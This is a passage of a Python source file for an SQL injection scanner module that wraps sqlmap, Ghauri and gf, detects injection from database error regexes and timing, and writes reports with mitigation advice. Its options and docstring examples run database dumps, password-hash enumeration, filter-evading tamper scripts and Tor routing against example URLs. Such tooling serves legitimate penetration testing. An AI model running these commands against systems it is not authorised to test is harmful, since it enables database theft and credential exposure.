                        r"mysql_fetch_array\(\)",
                        r"ORA-\d{5}",
                        r"Microsoft.*ODBC.*SQL Server",
                        r"PostgreSQL.*ERROR",
                        r"SQLite.*error",
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_",
                        r"valid MySQL result",
                        r"MySqlClient\.",
                        r"SQLServer JDBC Driver",
                        r"SqlException",
                        r"Oracle error",
                        r"Oracle.*Driver",
                        r"OracleException",
                        r"Microsoft JET Database",
                        r"Access Database Engine",
                        r"Microsoft Access Driver",
                        r"SQL Server.*Native Client",
                        r"SQL Server.*JDBC",
                        r"SQL Server.*Error",
                        r"Microsoft SQL Native Client",
                        r"Incorrect syntax near",
                        r"Unclosed quotation mark",
                        r"quoted string not properly terminated",
                        r"unterminated string literal",
                        r"Error converting data type",
                        r"syntax error at or near",
                        r"column.*does not exist",
                        r"table.*doesn't exist",
                        r"Unknown column",
                        r"ambiguous column name",
                        r"Invalid column name",
                        r"must declare the scalar variable",
                        r"Invalid object name",
                        r"supplied argument is not a valid",
                        r"Column count doesn't match",
                        r"The used SELECT statements have a different number of columns",
                        r"Division by zero",
                        r"Data type mismatch",
                    ]

                    potential_sqli = False
                    error_found = None

                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            potential_sqli = True
                            error_found = pattern
                            break

                    # Check for time-based injection
                    time_based = response_time > 4.5 and "SLEEP" in payload.upper()

                    if potential_sqli or time_based:
                        results.append(
                            {
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "method": "GET",
                                "vulnerable": True,
                                "type": "time-based" if time_based else "error-based",
                                "error_pattern": error_found,
                                "response_time": response_time,
                                "status_code": response.status_code,
                                "content_length": len(response.content),
                            }
                        )

        except Exception:
            continue

    return results


def run_sqlmap(url, options=None, timeout=300):
    """Run SQLMap with specified options."""
    if options is None:
        options = {}

    output_dir = options.get("output_dir", "output/vulnsqlicli")
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Build SQLMap command
    cmd = ["sqlmap", "-u", url]

    # Add common options
    if options.get("batch", True):
        cmd.append("--batch")

    if options.get("level", 1) > 1:
        cmd.extend(["--level", str(options["level"])])

    if options.get("risk", 1) > 1:
        cmd.extend(["--risk", str(options["risk"])])

    if options.get("threads", 1) > 1:
        cmd.extend(["--threads", str(options["threads"])])

    if options.get("technique"):
        cmd.extend(["--technique", options["technique"]])

    if options.get("dbms"):
        cmd.extend(["--dbms", options["dbms"]])

    if options.get("cookie"):
        cmd.extend(["--cookie", options["cookie"]])

    if options.get("headers"):
        for header in options["headers"]:
            cmd.extend(["--header", header])

    if options.get("data"):
        cmd.extend(["--data", options["data"]])

    if options.get("proxy"):
        cmd.extend(["--proxy", options["proxy"]])

    if options.get("user_agent"):
        cmd.extend(["--user-agent", options["user_agent"]])

    if options.get("random_agent"):
        cmd.append("--random-agent")

    if options.get("tor"):
        cmd.append("--tor")

    if options.get("check_tor"):
        cmd.append("--check-tor")

    # Output options
    output_file = os.path.join(
        output_dir, f"sqlmap_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )
    cmd.extend(["--output-dir", output_dir])

    # Tamper scripts
    if options.get("tamper"):
        cmd.extend(["--tamper", options["tamper"]])

    # Advanced options
    if options.get("dbs"):
        cmd.append("--dbs")

    if options.get("tables"):
        cmd.append("--tables")

    if options.get("columns"):
        cmd.append("--columns")

    if options.get("dump"):
        cmd.append("--dump")

    if options.get("dump_all"):
        cmd.append("--dump-all")

    if options.get("passwords"):
        cmd.append("--passwords")

    if options.get("privileges"):
        cmd.append("--privileges")

    if options.get("current_user"):
        cmd.append("--current-user")

    if options.get("current_db"):
        cmd.append("--current-db")

    if options.get("hostname"):
        cmd.append("--hostname")

    if options.get("schema"):
        cmd.append("--schema")

    if options.get("search"):
        cmd.extend(["--search", options["search"]])

    # Add custom SQLMap arguments
    if options.get("sqlmap_args"):
        custom_args = options["sqlmap_args"].split()
        cmd.extend(custom_args)

    try:
        # Run SQLMap
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, cwd=output_dir
        )

        return {
            "success": True,
            "command": " ".join(cmd),
            "stdout": result.stdout,
            "stderr": result.stderr,
            "return_code": result.returncode,
            "output_file": output_file,
            "output_dir": output_dir,
        }
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": "Timeout expired",
            "timeout": timeout,
        }
    except Exception as e:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": str(e),
        }


def run_ghauri(url, options=None, timeout=300):
    """Run Ghauri with specified options."""
    if options is None:
        options = {}

    output_dir = options.get("output_dir", "output/vulnsqlicli")
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Build Ghauri command
    cmd = ["ghauri", "-u", url]

    # Add common options
    if options.get("batch", True):
        cmd.append("--batch")

    if options.get("level", 1) > 1:
        cmd.extend(["--level", str(options["level"])])

    if options.get("risk", 1) > 1:
        cmd.extend(["--risk", str(options["risk"])])

    if options.get("threads", 1) > 1:
        cmd.extend(["--threads", str(options["threads"])])

    if options.get("technique"):
        cmd.extend(["--technique", options["technique"]])

    if options.get("dbms"):
        cmd.extend(["--dbms", options["dbms"]])

    if options.get("cookie"):
        cmd.extend(["--cookie", options["cookie"]])

    if options.get("headers"):
        for header in options["headers"]:
            cmd.extend(["--header", header])

    if options.get("data"):
        cmd.extend(["--data", options["data"]])

    if options.get("proxy"):
        cmd.extend(["--proxy", options["proxy"]])

    if options.get("user_agent"):
        cmd.extend(["--user-agent", options["user_agent"]])

    if options.get("random_agent"):
        cmd.append("--random-agent")

    # Output options
    output_file = os.path.join(
        output_dir, f"ghauri_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )

    # Tamper scripts
    if options.get("tamper"):
        cmd.extend(["--tamper", options["tamper"]])

    # Advanced options
    if options.get("dbs"):
        cmd.append("--dbs")

    if options.get("tables"):
        cmd.append("--tables")

    if options.get("columns"):
        cmd.append("--columns")

    if options.get("dump"):
        cmd.append("--dump")

    if options.get("current_user"):
        cmd.append("--current-user")

    if options.get("current_db"):
        cmd.append("--current-db")

    if options.get("hostname"):
        cmd.append("--hostname")

    # Add custom Ghauri arguments
    if options.get("ghauri_args"):
        custom_args = options["ghauri_args"].split()
        cmd.extend(custom_args)

    try:
        # Run Ghauri
        with open(output_file, "w") as f:
            result = subprocess.run(
                cmd,
                stdout=f,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout,
                cwd=output_dir,
            )

        # Read output
        with open(output_file, "r") as f:
            stdout_content = f.read()

        return {
            "success": True,
            "command": " ".join(cmd),
            "stdout": stdout_content,
            "stderr": result.stderr,
            "return_code": result.returncode,
            "output_file": output_file,
            "output_dir": output_dir,
        }
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": "Timeout expired",
            "timeout": timeout,
        }
    except Exception as e:
        return {
            "success": False,
            "command": " ".join(cmd),
            "error": str(e),
        }


def run_gf_sqli_patterns(urls, output_dir, timeout=30):
    """Run GF with SQL injection patterns."""
    if not isinstance(urls, list):
        urls = [urls]

    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # SQL injection related patterns
    sqli_patterns = [
        "sqli",
        "sqli-error",
        "php-sinks",
        "allparam",
        "urlparams",
        "endpoints",
    ]

    results = {}

    for pattern in sqli_patterns:
        try:
            # Create temporary file with URLs
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", delete=False
            ) as f:
                for url in urls:
                    f.write(url + "\n")
                temp_file = f.name

            # Run GF with pattern
            output_file = os.path.join(
                output_dir,
                f"gf_{pattern}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            )

            cmd = ["gf", pattern]

            with open(temp_file, "r") as input_file, open(output_file, "w") as output_f:
                result = subprocess.run(
                    cmd,
                    stdin=input_file,
                    stdout=output_f,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=timeout,
                )

            # Read results
            with open(output_file, "r") as f:
                matches = f.read().strip()

            # Clean up temp file
            os.unlink(temp_file)

            results[pattern] = {
                "success": True,
                "command": " ".join(cmd),
                "output_file": output_file,
                "matches": matches.split("\n") if matches else [],
                "match_count": len(matches.split("\n")) if matches else 0,
                "return_code": result.returncode,
                "stderr": result.stderr,
            }

        except subprocess.TimeoutExpired:
            results[pattern] = {
                "success": False,
                "command": " ".join(cmd),
                "error": "Timeout expired",
                "timeout": timeout,
            }
        except Exception as e:
            results[pattern] = {
                "success": False,
                "command": " ".join(cmd) if "cmd" in locals() else "gf " + pattern,
                "error": str(e),
            }

    return results


def analyze_gf_results(gf_results):
    """Analyze GF results for SQL injection indicators."""
    findings = []

    for pattern, result in gf_results.items():
        if result.get("success") and result.get("matches"):
            for match in result["matches"]:
                if match.strip():
                    # Parse URL and identify parameters
                    try:
                        parsed = urlparse(match.strip())
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            for param in params:
                                findings.append(
                                    {
                                        "url": match.strip(),
                                        "parameter": param,
                                        "pattern": pattern,
                                        "tool": "GF",
                                        "severity": "MEDIUM",
                                        "description": f"URL matched GF pattern '{pattern}' - potential SQL injection point",
                                        "location": "URL_PARAMETER",
                                    }
                                )
                    except Exception:
                        # If URL parsing fails, still record the match
                        findings.append(
                            {
                                "url": match.strip(),
                                "parameter": "unknown",
                                "pattern": pattern,
                                "tool": "GF",
                                "severity": "LOW",
                                "description": f"URL matched GF pattern '{pattern}'",
                                "location": "UNKNOWN",
                            }
                        )

    return findings


def parse_sqlmap_output(output_file):
    """Parse SQLMap output for findings."""
    findings = []

    try:
        with open(output_file, "r") as f:
            content = f.read()

        # Parse for vulnerabilities
        vuln_patterns = [
            r"Parameter: (.+?) \((.+?)\)",
            r"Type: (.+)",
            r"Title: (.+)",
            r"Payload: (.+)",
            r"back-end DBMS: (.+)",
            r"current user: (.+)",
            r"current database: (.+)",
            r"hostname: (.+)",
            r"available databases \[(\d+)\]:",
            r"Database: (.+)",
            r"Table: (.+)",
        ]

        for pattern in vuln_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            if matches:
                findings.extend(matches)

        # Check for successful injection
        if "sqlmap identified the following injection point(s)" in content:
            findings.append("SQL injection vulnerability confirmed")

        if "back-end DBMS:" in content:
            findings.append("Database management system identified")

        if "current user:" in content:
            findings.append("Current user extracted")

        if "current database:" in content:
            findings.append("Current database extracted")

        if "available databases" in content:
            findings.append("Database enumeration successful")

        if "Table:" in content:
            findings.append("Table enumeration successful")

    except Exception as e:
        findings.append(f"Error parsing output: {str(e)}")

    return findings


def parse_ghauri_output(output_file):
    """Parse Ghauri output for findings."""
    findings = []

    try:
        with open(output_file, "r") as f:
            content = f.read()

        # Parse for vulnerabilities
        vuln_patterns = [
            r"Parameter: (.+?) is vulnerable",
            r"Type: (.+)",
            r"Payload: (.+)",
            r"back-end DBMS: (.+)",
            r"current user: (.+)",
            r"current database: (.+)",
            r"hostname: (.+)",
            r"available databases: (.+)",
            r"Database: (.+)",
            r"Table: (.+)",
        ]

        for pattern in vuln_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            if matches:
                findings.extend(matches)

        # Check for successful injection
        if "is vulnerable" in content:
            findings.append("SQL injection vulnerability confirmed")

        if "back-end DBMS:" in content:
            findings.append("Database management system identified")

        if "current user:" in content:
            findings.append("Current user extracted")

        if "current database:" in content:
            findings.append("Current database extracted")

        if "available databases:" in content:
            findings.append("Database enumeration successful")

        if "Table:" in content:
            findings.append("Table enumeration successful")

    except Exception as e:
        findings.append(f"Error parsing output: {str(e)}")

    return findings


def generate_comprehensive_report(results, output_dir):
    """Generate comprehensive vulnerability report."""
    report = {
        "summary": {
            "total_targets": len(results),
            "vulnerable_targets": 0,
            "critical_vulnerabilities": [],
            "high_vulnerabilities": [],
            "medium_vulnerabilities": [],
            "low_vulnerabilities": [],
            "tools_used": [],
            "scan_timestamp": datetime.now().isoformat(),
        },
        "detailed_results": results,
        "recommendations": [],
        "mitigation_strategies": [],
    }

    # Analyze results
    for result in results:
        target = result.get("target", "Unknown")

        # Check for vulnerabilities
        if result.get("sqlmap_results", {}).get("success"):
            findings = result.get("sqlmap_findings", [])
            if any("vulnerability confirmed" in str(f).lower() for f in findings):
                report["summary"]["vulnerable_targets"] += 1
                report["summary"]["critical_vulnerabilities"].append(
                    {
                        "target": target,
                        "vulnerability": "SQL Injection",
                        "tool": "SQLMap",
                        "severity": "CRITICAL",
                        "description": "SQL injection vulnerability confirmed by SQLMap",
                    }
                )

        if result.get("ghauri_results", {}).get("success"):
            findings = result.get("ghauri_findings", [])
            if any("vulnerability confirmed" in str(f).lower() for f in findings):
                report["summary"]["vulnerable_targets"] += 1
                report["summary"]["critical_vulnerabilities"].append(
                    {
                        "target": target,
                        "vulnerability": "SQL Injection",
                        "tool": "Ghauri",
                        "severity": "CRITICAL",
                        "description": "SQL injection vulnerability confirmed by Ghauri",
                    }
                )

        if result.get("basic_sqli_results"):
            for vuln in result["basic_sqli_results"]:
                if vuln.get("vulnerable"):
                    report["summary"]["vulnerable_targets"] += 1
                    report["summary"]["high_vulnerabilities"].append(
                        {
                            "target": target,
                            "vulnerability": "SQL Injection",
                            "tool": "Basic Testing",
                            "severity": "HIGH",
                            "description": f"Potential SQL injection in parameter: {vuln.get('parameter')}",
                            "payload": vuln.get("payload"),
                        }
                    )

        # Track tools used
        if result.get("sqlmap_results"):
            report["summary"]["tools_used"].append("SQLMap")
        if result.get("ghauri_results"):
            report["summary"]["tools_used"].append("Ghauri")
        if result.get("gf_results"):
            report["summary"]["tools_used"].append("GF")
        if result.get("basic_sqli_results"):
            report["summary"]["tools_used"].append("Basic Testing")

    # Remove duplicates
    report["summary"]["tools_used"] = list(set(report["summary"]["tools_used"]))

    # Generate recommendations
    if report["summary"]["critical_vulnerabilities"]:
        report["recommendations"].extend(
            [
                "🚨 CRITICAL: Immediately patch all SQL injection vulnerabilities",
                "🔒 Implement parameterized queries/prepared statements",
                "🛡️ Use stored procedures with proper input validation",
                "🧼 Sanitize and validate all user inputs",
                "⚡ Implement proper error handling to prevent information disclosure",
            ]
        )

    if report["summary"]["high_vulnerabilities"]:
        report["recommendations"].extend(
            [
                "⚠️ HIGH: Review and fix potential SQL injection points",
                "🔍 Conduct thorough code review for injection vulnerabilities",
                "🎯 Implement input validation and output encoding",
            ]
        )

    # General recommendations
    report["recommendations"].extend(
        [
            "🔐 Use principle of least privilege for database accounts",
            "📊 Implement database activity monitoring",
            "🔄 Regular security testing and vulnerability assessments",
            "🛠️ Keep database systems and applications updated",
            "🏗️ Implement Web Application Firewall (WAF)",
        ]
    )

    # Mitigation strategies
    report["mitigation_strategies"] = [
        {
            "strategy": "Input Validation",
            "description": "Implement strict input validation for all user inputs",
            "implementation": "Use whitelist validation, length limits, and data type checks",
            "priority": "HIGH",
        },
        {
            "strategy": "Parameterized Queries",
            "description": "Use parameterized queries or prepared statements",
            "implementation": "Replace dynamic SQL with parameterized queries in all database interactions",
            "priority": "CRITICAL",
        },
        {
            "strategy": "Stored Procedures",
            "description": "Use stored procedures with proper input validation",
            "implementation": "Implement stored procedures for database operations with input validation",
            "priority": "HIGH",
        },
        {
            "strategy": "Error Handling",
            "description": "Implement proper error handling to prevent information disclosure",
            "implementation": "Use generic error messages and log detailed errors securely",
            "priority": "MEDIUM",
        },
        {
            "strategy": "Database Security",
            "description": "Implement database security best practices",
            "implementation": "Use least privilege accounts, disable unnecessary features, enable logging",
            "priority": "HIGH",
        },
    ]

    return report


def save_results(results, output_dir, format_type="json"):
    """Save scan results to files."""
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    if format_type == "json":
        output_file = output_path / f"vulnsqlicli_results_{timestamp}.json"
        with open(output_file, "w") as f:
            json.dump(results, f, indent=2, default=str)
        return output_file

    elif format_type == "yaml":
        output_file = output_path / f"vulnsqlicli_results_{timestamp}.yaml"
        with open(output_file, "w") as f:
            yaml.dump(results, f, default_flow_style=False, allow_unicode=True)
        return output_file

    elif format_type == "markdown":
        output_file = output_path / f"vulnsqlicli_report_{timestamp}.md"
        with open(output_file, "w") as f:
            f.write("# SQL Injection Vulnerability Assessment Report\n\n")
            f.write(
                f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            )

            if "summary" in results:
                f.write("## Executive Summary\n\n")
                f.write(f"- **Total Targets:** {results['summary']['total_targets']}\n")
                f.write(
                    f"- **Vulnerable Targets:** {results['summary']['vulnerable_targets']}\n"
                )
                f.write(
                    f"- **Critical Vulnerabilities:** {len(results['summary']['critical_vulnerabilities'])}\n"
                )
                f.write(
                    f"- **High Risk Vulnerabilities:** {len(results['summary']['high_vulnerabilities'])}\n"
                )
                f.write(
                    f"- **Medium Risk Vulnerabilities:** {len(results['summary']['medium_vulnerabilities'])}\n"
                )
                f.write(
                    f"- **Tools Used:** {', '.join(results['summary']['tools_used'])}\n\n"
                )

                if results["summary"]["critical_vulnerabilities"]:
                    f.write("## 🚨 Critical Vulnerabilities\n\n")
                    for vuln in results["summary"]["critical_vulnerabilities"]:
                        f.write(f"### {vuln['vulnerability']} - {vuln['target']}\n")
                        f.write(f"- **Tool:** {vuln['tool']}\n")
                        f.write(f"- **Severity:** {vuln['severity']}\n")
                        f.write(f"- **Description:** {vuln['description']}\n\n")

                if results["summary"]["high_vulnerabilities"]:
                    f.write("## ⚠️ High Risk Vulnerabilities\n\n")
                    for vuln in results["summary"]["high_vulnerabilities"]:
                        f.write(f"### {vuln['vulnerability']} - {vuln['target']}\n")
                        f.write(f"- **Tool:** {vuln['tool']}\n")
                        f.write(f"- **Severity:** {vuln['severity']}\n")
                        f.write(f"- **Description:** {vuln['description']}\n")
                        if vuln.get("payload"):
                            f.write(f"- **Payload:** `{vuln['payload']}`\n")
                        f.write("\n")

                if results.get("recommendations"):
                    f.write("## 📋 Recommendations\n\n")
                    for rec in results["recommendations"]:
                        f.write(f"- {rec}\n")
                    f.write("\n")

                if results.get("mitigation_strategies"):
                    f.write("## 🛡️ Mitigation Strategies\n\n")
                    for strategy in results["mitigation_strategies"]:
                        f.write(
                            f"### {strategy['strategy']} ({strategy['priority']} Priority)\n"
                        )
                        f.write(f"**Description:** {strategy['description']}\n\n")
                        f.write(f"**Implementation:** {strategy['implementation']}\n\n")

        return output_file


@click.command()
@click.option("--url", help="Target URL to test for SQL injection")
@click.option(
    "--urls-file",
    type=click.Path(exists=True),
    help="File containing URLs (one per line)",
)
@click.option(
    "--tool",
    type=click.Choice(["sqlmap", "ghauri", "gf", "all", "basic"]),
    default="all",
    help="SQL injection tool to use",
)
@click.option("--sqlmap", is_flag=True, help="Use SQLMap for testing")
@click.option("--ghauri", is_flag=True, help="Use Ghauri for testing")
@click.option("--gf", is_flag=True, help="Use GF (grep for fun) for pattern matching")
@click.option("--basic-test", is_flag=True, help="Perform basic SQL injection tests")
@click.option("--level", default=1, type=int, help="Testing level (1-5)")
@click.option("--risk", default=1, type=int, help="Risk level (1-3)")
@click.option("--technique", help="SQL injection technique (B,E,U,S,T,Q)")
@click.option("--dbms", help="Force DBMS (mysql,mssql,oracle,postgresql,sqlite)")
@click.option("--cookie", help="HTTP Cookie header value")
@click.option("--data", help="Data string to be sent through POST")
@click.option("--proxy", help="HTTP proxy URL (e.g., http://127.0.0.1:8080)")
@click.option("--user-agent", help="HTTP User-Agent header value")
@click.option("--random-agent", is_flag=True, help="Use random User-Agent")
@click.option("--headers", multiple=True, help="Extra HTTP headers")
@click.option("--tamper", help="Tamper script(s) to use")
@click.option("--timeout", default=300, type=int, help="Tool timeout in seconds")
@click.option("--threads", default=1, type=int, help="Number of threads")
@click.option("--batch", is_flag=True, default=True, help="Non-interactive mode")
@click.option("--tor", is_flag=True, help="Use Tor anonymity network")
@click.option("--check-tor", is_flag=True, help="Check if Tor is working")
@click.option("--dbs", is_flag=True, help="Enumerate DBMS databases")
@click.option("--tables", is_flag=True, help="Enumerate DBMS tables")
@click.option("--columns", is_flag=True, help="Enumerate DBMS columns")
@click.option("--dump", is_flag=True, help="Dump DBMS database table entries")
@click.option("--dump-all", is_flag=True, help="Dump all DBMS databases")
@click.option("--passwords", is_flag=True, help="Enumerate DBMS users password hashes")
@click.option("--privileges", is_flag=True, help="Enumerate DBMS users privileges")
@click.option("--current-user", is_flag=True, help="Retrieve DBMS current user")
@click.option("--current-db", is_flag=True, help="Retrieve DBMS current database")
@click.option("--hostname", is_flag=True, help="Retrieve DBMS server hostname")
@click.option("--schema", is_flag=True, help="Enumerate DBMS schema")
@click.option("--search", help="Search for databases, tables, and columns")
@click.option("--output-dir", default="output/vulnsqlicli", help="Output directory")
@click.option("--json-report", is_flag=True, help="Generate JSON report")
@click.option("--yaml-report", is_flag=True, help="Generate YAML report")
@click.option("--markdown-report", is_flag=True, help="Generate Markdown report")
@click.option("--slack-webhook", help="Slack webhook URL for notifications")
@click.option("--discord-webhook", help="Discord webhook URL for notifications")
@click.option("--verbose", "-v", is_flag=True, help="Enable verbose output")
@click.option("--check-tools", is_flag=True, help="Check tool availability and exit")
@click.option(
    "--resume", is_flag=True, help="Resume interrupted scan from previous state"
)
@click.option(
    "--force-resume",
    is_flag=True,
    help="Force resume even if scan appears to be running",
)
@click.option("--show-resume", is_flag=True, help="Show previous scan resume status")
@click.option("--clear-resume", is_flag=True, help="Clear previous scan state")
@click.option(
    "--resume-stat", is_flag=True, help="Show detailed resume statistics and progress"
)
@click.option(
    "--resume-reset", is_flag=True, help="Reset and clear all resume data completely"
)
@click.option(
    "--ai", is_flag=True, help="Enable AI-powered analysis of SQL injection results"
)
@click.option(
    "--payloads",
    type=click.Path(exists=True),
    help="Custom SQL injection payloads file",
)
@click.option(
    "--sqlmap-args", help="Custom arguments for SQLMap (e.g., '--threads 5 --level 3')"
)
@click.option(
    "--ghauri-args", help="Custom arguments for Ghauri (e.g., '--threads 10 --level 2')"
)
@click.option(
    "--store-db", help="Store results in SQLite database (specify database path)"
)
@click.option(
    "--dry-run",
    is_flag=True,
    help="Show what would be executed without running actual tests",
)
@click.option(
    "--retry",
    default=3,
    type=int,
    help="Number of retries for failed requests (default: 3)",
)
@click.option(
    "--concurrency",
    default=1,
    type=int,
    help="Number of concurrent URL scans (default: 1)",
)
# ========== Cache Options ==========
@click.option(
    "--cache", is_flag=True, help="Enable intelligent caching for faster repeated scans"
)
@click.option("--cache-dir", default="nuclei_cache", help="Directory for cache storage")
@click.option("--cache-max-age", type=int, default=24, help="Cache TTL in hours")
@click.option("--cache-stats", is_flag=True, help="Show cache statistics and exit")
@click.option("--clear-cache", is_flag=True, help="Clear all cached results and exit")
def main(
    url,
    urls_file,
    tool,
    sqlmap,
    ghauri,
    gf,
    basic_test,
    level,
    risk,
    technique,
    dbms,
    cookie,
    data,
    proxy,
    user_agent,
    random_agent,
    headers,
    tamper,
    timeout,
    threads,
    batch,
    tor,
    check_tor,
    dbs,
    tables,
    columns,
    dump,
    dump_all,
    passwords,
    privileges,
    current_user,
    current_db,
    hostname,
    schema,
    search,
    output_dir,
    json_report,
    yaml_report,
    markdown_report,
    slack_webhook,
    discord_webhook,
    verbose,
    check_tools,
    force_resume,
    resume,
    show_resume,
    clear_resume,
    resume_stat,
    resume_reset,
    ai,
    payloads,
    sqlmap_args,
    ghauri_args,
    store_db,
    dry_run,
    retry,
    concurrency,
    cache,
    cache_dir,
    cache_max_age,
    cache_stats,
    clear_cache,
):
    """
    🔍 Advanced SQL Injection Vulnerability Scanner

    Comprehensive SQL injection testing using multiple tools:
    • SQLMap - Advanced SQL injection detection and exploitation
    • Ghauri - Fast SQL injection detection and exploitation
    • GF (grep for fun) - Pattern matching for SQL injection indicators
    • Basic Testing - Manual payload testing

    Security Testing Features:
    --sqlmap                     # Use SQLMap for comprehensive testing
    --ghauri                     # Use Ghauri for fast detection
    --gf                         # Use GF for pattern matching
    --basic-test                 # Perform basic manual testing
    --tool all                   # Use all available tools

    Advanced Options:
    --level 3                    # Testing level (1-5)
    --risk 2                     # Risk level (1-3)
    --technique BEUST            # SQL injection techniques
    --dbms mysql                 # Force specific DBMS
    --tamper space2comment       # Use tamper scripts
    --proxy http://127.0.0.1:8080 # HTTP proxy
    --tor                        # Use Tor network

    Database Enumeration:
    --dbs                        # Enumerate databases
    --tables                     # Enumerate tables
    --columns                    # Enumerate columns
    --dump                       # Dump table data
    --current-user               # Get current user
    --current-db                 # Get current database
    --passwords                  # Enumerate password hashes
    --privileges                 # Enumerate user privileges

    Resume & State Management:
    --resume                     # Resume interrupted scan from previous state
    --show-resume                # Show previous scan resume status
    --clear-resume               # Clear previous scan state
    --resume-stat                # Show detailed resume statistics and progress
    --resume-reset               # Reset and clear all resume data completely
    --force-resume               # Force resume even if scan appears running

    Examples:
    # Basic SQL injection testing
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --basic-test

    # Comprehensive testing with SQLMap
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --level 3 --risk 2

    # Fast detection with Ghauri
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --ghauri --batch

    # Pattern matching with GF
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --gf

    # Full enumeration after finding vulnerability
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --dbs --tables --columns --current-user

    # Test multiple URLs from file
    reconcli vulnsqlicli --urls-file urls.txt --tool all --json-report --markdown-report

    # Advanced testing with proxy and tamper
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --proxy http://127.0.0.1:8080 --tamper space2comment,charencode --level 5 --risk 3

    # Steganographic testing with Tor
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --tor --check-tor --random-agent --level 3

    # Resume interrupted scan
    reconcli vulnsqlicli --resume --verbose

    # Show detailed resume statistics
    reconcli vulnsqlicli --resume-stat

    # Show basic resume status
    reconcli vulnsqlicli --show-resume

    # Clear previous scan state
    reconcli vulnsqlicli --clear-resume

    # Reset all resume data completely
    reconcli vulnsqlicli --resume-reset

    # Resume with force (if scan appears to be running)
    reconcli vulnsqlicli --resume --force-resume

    AI-Enhanced Analysis:
    # Enable AI-powered analysis of results
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --ai --verbose

    # AI analysis with custom payloads
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --payloads custom_sqli.txt --ai --json-report

    # AI analysis with all tools
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --tool all --ai --markdown-report

    Custom Tool Arguments:
    # Custom SQLMap arguments
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --sqlmap-args "--threads 10 --level 5 --risk 3 --technique BEUST"

    # Custom Ghauri arguments
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --ghauri --ghauri-args "--threads 15 --level 4 --batch"

    # Combined AI and custom arguments
    reconcli vulnsqlicli --url "http://example.com/page.php?id=1" --sqlmap --sqlmap-args "--tamper space2comment,charencode" --ai --verbose

    Advanced Workflows:
    # Custom payloads with AI analysis and custom SQLMap args
    reconcli vulnsqlicli --urls-file targets.txt --payloads advanced_payloads.txt --sqlmap-args "--level 5 --risk 3" --ai --json-report --markdown-report

    # Full enterprise assessment
    reconcli vulnsqlicli --urls-file enterprise_targets.txt --tool all --ai --sqlmap-args "--threads 20 --level 4" --ghauri-args "--threads 25 --level 3" --json-report --slack-webhook https://hooks.slack.com/...
    """

    # ========== Cache System ==========
    cache_manager = None
    if cache or cache_stats or clear_cache:
        cache_manager = VulnSQLCacheManager(
            cache_dir=cache_dir, max_age_hours=cache_max_age
        )

        if clear_cache:
            if cache_manager.clear_cache():
                print(f"✅ [CACHE] Cache cleared successfully: {cache_dir}")
            else:
                print(f"❌ [CACHE] Failed to clear cache: {cache_dir}")
            return

        if cache_stats:
            stats = cache_manager.get_cache_stats()
            print("📊 [CACHE] VulnSQL Cache Statistics:")
            print(f"    Cache hits: {stats['cache_hits']}")
            print(f"    Cache misses: {stats['cache_misses']}")
            print(f"    Hit rate: {stats['hit_rate']}")
            print(f"    Total requests: {stats['total_requests']}")
            print(f"    Cache files: {stats['cache_files']}")
            print(f"    Cache size: {stats['cache_size']} bytes")
            print(f"    Cache directory: {stats['cache_dir']}")
            return

    # Validate required parameters
    if not url and not urls_file:
        print(
            "❌ Error: URL or URLs file is required for SQL injection scanning. Use --help for options."
        )
        print("💡 Available cache-only commands: --cache-stats, --clear-cache")
        return

    if verbose:
        print("🚀 [START] VulnSQLiCLI - Advanced SQL Injection Scanner")
        if url:
            print(f"🎯 [TARGET] {url}")
        if urls_file:
            print(f"📁 [TARGETS] {urls_file}")
        if cache_manager:
            print(
                f"💾 [CACHE] Cache: ENABLED (dir: {cache_dir}, TTL: {cache_max_age}h)"
            )
        else:
            print("💾 [CACHE] Cache: DISABLED")

    # Check tool availability
    if check_tools:
        print("🔧 [TOOLS] Checking tool availability...")
        tools = check_tool_availability()
        for tool_name, info in tools.items():
            if info["available"]:
                print(f"✅ {tool_name}: {info['version']} ({info['path']})")
            else:
                print(f"❌ {tool_name}: {info['error']}")
        return

    # Create output directory
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Resume functionality
    if show_resume:
        show_resume_status(output_dir)
        return

    if clear_resume:
        cleanup_resume_state(output_dir)
        return

    if resume_stat:
        show_detailed_resume_stats(output_dir)
        return

    if resume_reset:
        reset_all_resume_data(output_dir)
        return

    # Handle resume logic
    resume_state = None
    state_file = None

    if resume:
        resume_data = load_resume_state(output_dir)
        if resume_data:
            resume_state, state_file = resume_data
            if verbose:
                print(
                    f"⏸️ [RESUME] Resuming from previous state: {resume_state.get('scan_id')}"
                )
                print(
